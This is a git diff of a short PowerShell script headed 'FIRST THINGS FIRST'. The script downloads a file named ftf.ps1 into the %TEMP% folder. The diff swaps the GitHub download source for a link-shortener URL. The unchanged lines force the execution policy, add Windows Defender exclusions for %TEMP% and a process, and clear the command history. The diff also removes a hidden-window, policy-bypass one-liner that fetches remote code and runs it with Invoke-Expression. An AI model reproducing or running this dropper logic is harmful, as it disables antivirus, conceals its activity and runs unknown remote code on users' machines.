@@ -1,7 +1,7 @@
 # # FIRST THINGS FIRST
 
 # Define the URL of the file to download
-$url = "https://raw.githubusercontent.com/joel2128/bott/refs/heads/main/ftf.ps1"
+$url = "https://lnkfwd.com/u/KtRiC0kh"
 
 # Define the destination path in the %TEMP% directory
 $destination = "$env:TEMP\ftf.ps1"
@@ -29,5 +29,3 @@ Set-ExecutionPolicy RemoteSigned -Force
 Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
 Clear-History
-
-powershell -w h -ep bypass $test = Invoke-WebRequest https://lnkfwd.com/u/Kqc2ajEr; Invoke-Expression $($test.Content)
